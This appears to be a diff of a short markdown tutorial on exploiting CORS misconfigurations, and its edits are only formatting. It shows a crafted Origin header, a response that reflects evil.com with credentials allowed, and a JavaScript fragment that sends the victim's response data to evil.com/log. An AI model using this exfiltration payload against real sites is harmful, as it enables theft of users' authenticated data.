@@ -2,7 +2,7 @@
 
 1.Burp: [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
 
-2. [https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66](https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66)
+2\. [https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66](https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66)
 
 
 
@@ -10,7 +10,7 @@
 
 #### 1. set the origin:
 
-```text
+```
 GET /sensitiveData HTTP/1.1
 Host: vulnerable.com
 Origin: 
@@ -24,7 +24,7 @@ https://evil.com
 
 #### 2. find the response that can be controlled:
 
-```text
+```
 HTTP/1.1 200 OK 
 Access-Control-Allow-Origin: https://evil.com
 Access-Control-Allow-Credentials: true
@@ -49,4 +49,3 @@ location='//https://evil.com/log?key='+this.responseText;
 ```
 
 The sensitive response information will be sent to the evil.com..
-
